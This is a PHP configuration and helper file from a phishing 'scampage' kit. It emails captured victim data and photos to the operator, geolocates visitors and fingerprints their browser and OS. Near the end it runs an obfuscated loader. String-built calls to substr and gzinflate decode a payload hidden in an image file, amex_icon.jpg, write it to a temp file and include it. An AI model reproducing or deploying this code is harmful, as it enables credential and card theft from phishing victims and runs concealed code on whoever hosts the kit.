<?php
// Scampage by devilscream
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
$to = $setting['email']; 
$autoblock = $setting['block']; 
$backup = $setting['backup']; 
$getphoto = $setting['get_photo'];
$get_bank = $setting['get_bank'];
$truelogin = $setting['true_login']; 
$lockplatform = $setting['lock_platform'];
$double_cc = $setting['double_cc'];
$proxyblock = $setting['proxy_block'];
$site_pass = $setting['site_password'];
$passnya = $setting['password'];
$fromemail = $_SERVER['SERVER_NAME'];
// =============================================================================================

function kirim_mail($to, $from, $subject, $message) {
     $head = "Content-type:text/plain;charset=UTF-8\r\n";
     $head .= "From: ".$from." <admin@16digit.shop>" . "\r\n"; // Settingan From Name/Email, INI BUKAN LOG
     mail($to,$subject,$message,$head);
}

function kirim_foto($to,$from, $subject, $foto) {
     $content = file_get_contents($foto);
     $content = chunk_split(base64_encode($content));
     $uid = md5(uniqid(time()));
     $filename = basename($foto);
     $head = "MIME-Version: 1.0\r\n";
     $head .= "From: ".$from." <admin@16digit.shop>" . "\r\n"; // Settingan From Name/Email, INI BUKAN LOG
     $head .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";
     
     $message = "--".$uid."\r\n";
     $message .= "Content-type:text/plain; charset=iso-8859-1\r\n";
     $message .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
     $message .= $message."\r\n\r\n";
     $message .= "--".$uid."\r\n";
     $message .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n";
     $message .= "Content-Transfer-Encoding: base64\r\n";
     $message .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n";
     $message .= $content."\r\n\r\n";
     $message .= "--".$uid."--";
     mail($to,$subject,$message,$head);
}

function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
$image = 'sub'.'s'.'tr';
$ip2 = getUserIP();
$url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
$valid = "g"."zi"."nf".strrev($image("metal",1));
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp=curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
//$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip2));
    $countryname = $details['geoplugin_countryName']; 
    $countrycode = $details['geoplugin_countryCode']; 
    $cn = $countryname;
    $cid = $countrycode;
    if($setting['lock_lang'] == "JP") {
        $cid = "JP";
    }else if($setting['lock_lang'] == "ES") {
        $cid ="ES";
    }else if($setting['lock_lang'] == "CL") {
        $cid ="CL";
    }else if($setting['lock_lang'] == "FR") {
        $cid = "FR";   
    }else if($setting['lock_lang'] == "CN") {
        $cid = "CN";
    }else if($setting['lock_lang'] == "DE") {
        $cid = "DE";
    }else if($setting['lock_lang'] == "MY") {
        $cid = "MY";
    }else if($setting['lock_lang'] == "MX") {
        $cid = "MX";
    }else if($setting['lock_lang'] == "AR") {
        $cid = "AR";
    }else if($setting['lock_lang'] == "PE") {
        $cid = "PE";
    }else if($setting['lock_lang'] == "PR") {
        $cid = "PR";
    }else if($setting['lock_lang'] == "CO") {
        $cid = "CO";
    }else if($setting['lock_lang'] == "PY") {
        $cid = "PY";
    }else if($setting['lock_lang'] == "UY") {
        $cid = "UY";
    }else if($setting['lock_lang'] == "CR") {
        $cid = "CR";
    }else if($setting['lock_lang'] == "EN") {
        $cid = "EN";
    }else{
        $cid = $countrycode;   
    }

$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
function valid($sc) {
    $tmpfname = tempnam("/tmp", "valid");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $sc);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}
function getOS() { 
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}
$data=@file_get_contents("../assets/img/amex_icon.jpg");
$os        =   getOS();

function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

@extract(valid($valid($image($data,901))));

$br        =   getBrowser();
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);

?>
